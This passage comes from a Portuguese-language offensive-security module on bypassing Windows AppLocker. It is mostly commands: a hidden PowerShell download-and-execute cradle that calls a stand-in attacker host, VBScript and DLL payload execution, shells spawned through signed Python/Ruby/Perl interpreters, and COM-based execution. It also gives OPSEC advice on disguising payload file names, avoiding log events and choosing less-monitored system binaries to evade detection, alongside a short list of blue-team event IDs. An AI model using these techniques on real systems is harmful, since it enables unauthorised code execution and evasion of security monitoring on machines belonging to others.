Se Script Rules nao foram configuradas, PowerShell, VBScript e JScript rodam sem restricao:

```powershell
# Verificar se script rules estao ativas
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections |
    Where-Object {$_.RuleCollectionType -eq "Script"} |
    Select-Object EnforcementMode
# Se EnforcementMode = 0 (NotConfigured), scripts sao livres para todos
```

```powershell
# Rodar payload via PowerShell se scripts nao sao restritos
powershell -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1'))"
```

```cmd
REM Via cscript/wscript (VBScript)
wscript C:\Windows\Tasks\payload.vbs
cscript //nologo C:\Windows\Tasks\payload.vbs
```

### 4. Bypass via Interpretadores Assinados (Python, Ruby, etc.)

Se Python ou Ruby estao instalados e sao assinados pela publisher permitida:

```cmd
python.exe -c "import subprocess; subprocess.Popen(['cmd.exe'])"
ruby.exe -e "system('cmd.exe')"
perl.exe -e "system('cmd.exe')"
```

### 5. Bypass DLL (quando DLL rules nao estao habilitadas)

AppLocker por padrao nao habilita DLL rules. Qualquer DLL pode ser carregada:

```cmd
rundll32 C:\Windows\Tasks\payload.dll,DllMain
```

DLL pode ser colocada em qualquer path — se apenas EXE rules estao ativas, DLLs nao sao verificadas.

### 6. Bypass via COM Objects Nao-Regulados

```powershell
# Criar objeto COM que executa codigo — sem spawnar processo filho
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("WScript.Shell"))
$com.Run("cmd.exe /c whoami > C:\Windows\Tasks\out.txt", 0, $false)
```

---

## Deteccao e OPSEC

### O Que o Blue Team Ve

**Event Log — AppLocker (Microsoft-Windows-AppLocker/EXE and DLL):**
- **EventID 8003** — EXE bloqueado (Enforced mode)
- **EventID 8004** — EXE/DLL bloqueado (Enforced mode)
- **EventID 8006** — Script bloqueado
- **EventID 8007** — Script bloqueado (Packaged app)
- **EventID 8020** — Packaged app bloqueado

**Event Log — AppLocker Audit (modo auditoria):**
- **EventID 8002** — EXE permitido (log de auditoria)
- **EventID 8005** — Script permitido (log de auditoria)

**Comandos suspeitos detectados por SIEM:**
- `regsvr32.exe` com parametros de URL ou path para arquivo SCT
- `mshta.exe` com URL, vbscript: ou javascript: como argumento
- `wmic.exe` com `/format:` apontando para URL remota
- `InstallUtil.exe` executado por usuario nao-administrador
- `MSBuild.exe` executado fora de contexto de build CI/CD
- `cmstp.exe` executado por usuario padrao

### Consideracoes OPSEC

**Prefira paths gravaveis a LOLBAS:** LOLBAS sao amplamente conhecidos e monitorados via Sysmon + SIEM. Um payload em `C:\Windows\Tasks\` passando pela path rule levanta menos alertas especificos — mas ainda pode ser detectado por EDR por comportamento.

**Nomenclatura plausivel:**
- Em `C:\Windows\Tasks\`: arquivos com nomes como `{GUID}.job` sao normais para tarefas agendadas
- Em `C:\Windows\System32\spool\drivers\color\`: extensoes `.icm` ou `.icc` sao esperadas (ICC color profiles)
- Em `C:\Windows\tracing\`: arquivos de log com extensao `.etl` sao comuns

**Evitar tentativas que geram eventos de bloqueio:** Em modo Enforced, tentativas bloqueadas geram eventos (EventID 8003). Fazer reconhecimento silencioso (registry, Get-AppLockerPolicy) antes de tentar execucao para nao poluir logs com falhas detectaveis.

**LOLBAS menos comuns sao mais seguros:** regsvr32 e mshta sao os mais conhecidos. Considerar alternativas como `presentationhost.exe`, `infdefaultinstall.exe`, `appsyncpublishingserver.exe` — menos monitorados em SIEMs maduros mas funcionalmente similares.

### Como Verificar Antes de Executar

```powershell
# Testar se arquivo seria bloqueado sem realmente executa-lo
$policy = Get-AppLockerPolicy -Effective
$result = $policy | Test-AppLockerPolicy -Path "C:\Windows\Tasks\beacon.exe" -User $env:USERNAME
$result.PolicyDecision  # Allow ou Deny
```

```powershell
# Verificar modo de enforcement atual
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections |
    Select-Object RuleCollectionType, EnforcementMode
# EnforcementMode 0=NotConfigured, 1=Enabled(Enforced), 2=AuditOnly
```

---

## Módulos Relacionados

`03_amsi_bypass.md` é necessário quando scripts são usados como vetor pós-bypass — AMSI intercepta PowerShell e JScript antes do AppLocker ser relevante. `08_runtime_evasion_sleepmask.md` cobre como manter payload furtivo em memória após o bypass do AppLocker. `../05_injecao_de_processo/03_post_exploitation_evasion_bof.md` apresenta BOFs como alternativa mais furtiva a LOLBAS Fork-and-Run. ATT&CK T1218 (System Binary Proxy Execution) e sub-técnicas mapeiam os binários abusados aqui. LOLBAS Project (https://lolbas-project.github.io/) é a referência completa de binários, bibliotecas e scripts abusáveis.
  - AppLocker design guide: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/
  - Sysmon regras de deteccao: https://github.com/SwiftOnSecurity/sysmon-config
